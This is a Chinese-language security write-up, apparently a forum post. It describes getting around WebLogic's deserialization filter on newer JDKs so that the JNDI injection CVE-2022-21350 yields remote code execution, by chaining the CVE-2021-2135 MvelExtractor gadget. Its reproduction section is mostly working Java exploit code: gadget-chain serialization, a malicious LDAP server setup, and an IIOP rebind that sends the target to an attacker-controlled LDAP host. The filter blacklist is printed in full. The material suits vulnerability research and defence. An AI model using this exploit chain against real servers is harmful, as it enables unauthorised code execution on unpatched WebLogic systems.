Weblogic在2022年的补丁中，给一个JNDI注入的漏洞（CVE-2022-21350）CVSS评分定为6.5，根据漏洞发现者的描述，官方认为高版本的Weblogic中，提示了需要使用1.8.0\_191之上的JDK才足够安全，官方认为虽然可以JNDI注入，但是无法造成实际的影响。

![image_iZFZsUD1Wf.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-c495e0a465bddd940aa957f71ea2af2e8957ea98.png)

高版本的JDK禁止了直接利用RMI、LDAP等协议进行任意代码执行，同时使程序受JEP290保护，JDK中提供了一个setInternalObjectInputFilter，用户可以自行对这个filter进行定义。这个filter也是Weblogic把JNDI注入不当回事的底气。

但是经过研究，我发现了一种可以在高版本的JDK中进行Weblogic JNDI注入导致RCE的利用方法，当然这个方法在22-23年的某个补丁中被修复了。

高版本的限制
------

常规的高版本JDK JNDI注入，包含两种方法：

- 利用Tomcat的`BeanFactory`进行恶意类加载
- 利用LDAP的javaSerializedData属性进行反序列化

在Weblogic中不包含Tomcat相关依赖，因此我们重点关注第二种方法。Weblogic中存在众多的反序列化链，并且大多数链的修复方法都是将其加入黑名单。此处进行测试，随便使用一种反序列化链，在LDAP反序列化中进行使用，会发现反序列化失败，同时weblogic的日志中出现如下记录。可以看到是在ObjectInputFilter中对java.rmi.server.RemoteObjectInvocationHandler关键类进行了拒绝。

![Inkedimage__FqbDtMVCa.jpg](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-0ce8e3cdecf08676dc3cd35fc0a1ff9b12977c79.jpg)  
这是JDK的反序列化机制，用户可以自行定义类实现ObjectInputFilter接口，从而在反序列化的过程中建立一个白名单。 下图是从JNDI注入到程序进行反序列化类检查过程的调用链。

![image_OHTACQ9yzo.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-ed5413354f8c36b84a7a3d5564fa1fa37b7e0376.png)

其中在ObjectInputStream.filterCheck函数中进行了用户自定义InputFIilter类的调用。最终的检查是一个list逐个进行匹配。

![image_O5NEPWUgwl.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-78c22fa3182b94ddd44957bc2cf9d4cbe85e6b78.png)

黑名单的类如下：

```http
!org.codehaus.groovy.runtime.ConvertedClosure;!org.codehaus.groovy.runtime.ConversionHandler;!org.codehaus.groovy.runtime.MethodClosure;!org.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.UnicastRemoteObject;!java.rmi.server.RemoteObjectInvocationHandler;!com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.RemoteObject;!com.tangosol.coherence.rest.util.extractor.MvelExtractor;!java.lang.Runtime;!oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor;!org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;!org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor;!oracle.jdbc.pool.OraclePooledConnection;!org.apache.commons.collections.functors.*;!com.sun.org.apache.xalan.internal.xsltc.trax.*;!javassist.*;!java.rmi.activation.*;!sun.rmi.server.*;!org.jboss.interceptor.builder.*;!org.jboss.interceptor.reader.*;!org.jboss.interceptor.proxy.*;!org.jboss.interceptor.spi.metadata.*;!org.jboss.interceptor.spi.model.*;!com.bea.core.repackaged.springframework.aop.aspectj.*;!com.bea.core.repackaged.springframework.aop.aspectj.annotation.*;!com.bea.core.repackaged.springframework.aop.aspectj.autoproxy.*;!com.bea.core.repackaged.springframework.beans.factory.support.*;!org.python.core.*;!com.bea.core.repackaged.aspectj.weaver.tools.cache.*;!com.bea.core.repackaged.aspectj.weaver.tools.*;!com.bea.core.repackaged.aspectj.weaver.reflect.*;!com.bea.core.repackaged.aspectj.weaver.*;!com.oracle.wls.shaded.org.apache.xalan.xsltc.trax.*;!oracle.eclipselink.coherence.integrated.internal.querying.*;!oracle.eclipselink.coherence.integrated.internal.cache.*
```

寻找可用链
-----

用这份黑名单类和WebLogicFilterConfig中的封禁类做对比，发现如下两个变量里的类并没有被加如这个黑名单。

用这份黑名单类和WebLogicFilterConfig中的封禁类做对比，发现如下两个变量里的类并没有被加如这个黑名单。

```java
private static final String[] DEFAULT_WLS_ONLY_BLACKLIST_CLASSES = new String[]{"com.tangosol.util.extractor.ReflectionExtractor", "com.tangosol.util.extractor.ComparisonValueExtractor", "com.tangosol.util.extractor.ConditionalExtractor", "com.tangosol.util.extractor.ReflectionUpdater", "com.tangosol.util.extractor.ScriptValueExtractor", "com.tangosol.util.extractor.UniversalExtractor", "com.tangosol.util.extractor.UniversalUpdater", "com.tangosol.internal.util.SimpleBinaryEntry", "com.tangosol.coherence.component.util.daemon.queueProcessor.service.grid.partitionedService.PartitionedCache$Storage$BinaryEntry"};

private static final String[] DEFAULT_WLS_ONLY_BLACKLIST_PACKAGES = new String[]{"com.tangosol.internal.util.invoke", "com.tangosol.internal.util.invoke.lambda", "com.tangosol.coherence.rest.util.extractor", "com.tangosol.coherence.rest.util", "com.tangosol.coherence.component.application.console"};

```

其中com.tangosol.util.extractor.ReflectionExtractor、com.tangosol.util.extractor.ComparisonValueExtractor在之前的CVE-2020-2883出现过，但是ReflectionExtractor中存在补丁

![image_0CtmynyWNg.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-b72bb5a69b7139e7aa630a423f6ed294f243afe5.png)

无法再利用该类进行利用。

com.tangosol.util.extractor.UniversalExtractor出现在CVE-2020-14645，但是这条链的sink点依然是JNDI注入，因此也不再考虑。而com.tangosol.internal.util.SimpleBinaryEntry和com.tangosol.coherence.component.util.daemon.queueProcessor.service.grid.partitionedService.PartitionedCache\\$Storage\\$BinaryEntry ，被分别使用在了CVE-2021-2135和CVE-2021-35617。这两条链都属于二次反序列化，最终的sink点都是使用MvelExtractor直接执行java代码，因此理论上是可以使用的。但是在实际的测试中我发现，CVE-2021-35617的补丁点不单单是加入黑名单，同时是直接去除了一个重要类的serialize继承接口，导致整条无法使用。因此最后确定的可使用链就为CVE-2021-2135。

经过实际的测试，的确可以在JDK1.8u191及以上的版本中实现RCE。

![Inkedimage_KPx5R5L4em.jpg](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-578cef86494367280954e9c554b31f0a12bf3df8.jpg)

漏洞复现
----

使用如下代码，序列化CVE-2021-2135的POC。其中POC为发起一个URL请求，请求地址为http://TARGET\_IP/1234567

```java
public static Object getObject(String command) throws Exception {

    String cmd="new java.net.URL(\""+command+"\").openStream();";
    MvelExtractor mvelExtractor =new MvelExtractor();
    Reflections.setFieldValue(mvelExtractor,"m_sExpr",cmd);

    TopNAggregator.PartialResult partialResult =new TopNAggregator.PartialResult();

    Reflections.setFieldValue(partialResult,"m_comparator",mvelExtractor);
    Reflections.setFieldValue(partialResult,"m_cMaxSize",5);
    partialResult.add("123");

    ByteArrayWriteBuffer bufferOutput =new ByteArrayWriteBuffer(new byte[4096]);
    WriteBuffer.BufferOutput b =  bufferOutput.getBufferOutput();
    b.write((byte)10);
    ExternalizableHelper.writeExternalizableLite(b,partialResult);

    b.flush();
    DefaultSerializer defaultSerializer = new DefaultSerializer();
    Binary binary =new Binary(bufferOutput.toByteArray());
    SimpleBinaryEntry simpleBinaryEntry =new SimpleBinaryEntry();
    Reflections.setFieldValue(simpleBinaryEntry,"m_binKey",binary);
    Reflections.setFieldValue(simpleBinaryEntry,"m_serializer",defaultSerializer);
    XString xString =new XString("");
    InflatableMap inflatableMap =new InflatableMap();
    inflatableMap.put(simpleBinaryEntry,"456");
    inflatableMap.put("test","4657");
    Object o =  ((Object[]) Reflections.getFieldValue(inflatableMap,"m_oContents"))[1];
    Reflections.setFieldValue(o,"key",xString);
    ConditionalPutAll conditionalPutAll =new ConditionalPutAll();

    Reflections.setFieldValue(conditionalPutAll,"m_map",inflatableMap);
    AttributeHolder attributeHolder =new AttributeHolder();
    Reflections.setFieldValue(attributeHolder,"m_oValue",conditionalPutAll);

    return  attributeHolder;

}

public static void main(String[] args) throws Exception{
    ExternalizableHelper.setObjectStreamFactory(new WLSObjectStreamFactory());
    byte[] ser =Serializer.serialize(getObject("http://TARGET_IP/1234567"));
    System.out.println(Base64.encodeBase64String(ser));
}
```

将生成的base64字符串复制到[https://github.com/kxcode/JNDI-Exploit-Bypass-Demo](https://github.com/kxcode/JNDI-Exploit-Bypass-Demo "https://github.com/kxcode/JNDI-Exploit-Bypass-Demo")项目的HackerLDAPRefServer类的sendResult方法的e.addAttribute语句中

![image_aJOuhpERTE.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-69ef80fd6ca374db7fe584114e5136e049d46066.png)

然后使用maven编译这个项目，并放到测试机上。

![Inkedimage_wEmL0blj5m.jpg](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-b58df66f992c24bb1f0bf9268490772c2540fb89.jpg)

在攻击机上使用CVE-2022-21350的POC进行攻击。其中回连的JNDI地址为ldap://TARGET\_IP/aer

```java
public static Object getPrivateObject(String className) throws Exception{
    Field singleoneInstanceField = Unsafe.class.getDeclaredField("theUnsafe");
    singleoneInstanceField.setAccessible(true);
    Unsafe unsafe = (Unsafe)singleoneInstanceField.get(null);
    Class clzz = Class.forName(className);
    return unsafe.allocateInstance(clzz);
}

public static Object getOBject() throws Exception{

    BadAttributeValueExpException badAttributeValueExpException =new BadAttributeValueExpException(null);
    FileSessionData sessionData = (FileSessionData)getPrivateObject("weblogic.servlet.internal.session.FileSessionData");
    Reflections.setFieldValue(sessionData,"isValid",true);
    HashMap map = new HashMap();
    Properties props = new Properties();
    Name name = new CompoundName("ldap://TARGET_IP/aer",props);
    HomeHandleImpl homeHandle = new HomeHandleImpl();
    Reflections.setFieldValue(homeHandle,"jndiName",name);
    Reflections.setFieldValue(homeHandle,"serverURL","t3://127.0.0.1:7001");
    BusinessHandleImpl b =new BusinessHandleImpl();
    Reflections.setFieldValue(b,"homeHandle",homeHandle);
    AttributeWrapper attributeWrapper= new AttributeWrapper(b);
    map.put("wl_debug_session",attributeWrapper);
    Reflections.setFieldValue(attributeWrapper,"isEJBObjectWrapped",true);
    Reflections.setFieldValue(sessionData,"attributes",map);
    Reflections.setFieldValue(sessionData,"internalAttributes",new Hashtable<>());
    Reflections.setFieldValue(badAttributeValueExpException,"val",sessionData);
    return  badAttributeValueExpException;

}
public static void main(String[] args) {
    try {
        String ip = args[0];
        String port = args[1];
        String rhost = String.format("iiop://%s:%s", ip, port);
        Hashtable<String, String> e = new Hashtable<String, String>();
        e.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        e.put("java.naming.provider.url", rhost);
        Context context = new InitialContext(e);
        context.rebind("test", getOBject());

    } catch (Exception ex) {
        ex.printStackTrace();

    }
}
```

执行该POC后，在目标机上成功收到该请求。

![Inkedimage_eDywM-pC2x.jpg](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-9fe8f3cd782c3bfc97cd38c0d9ff842ea13d92a2.jpg)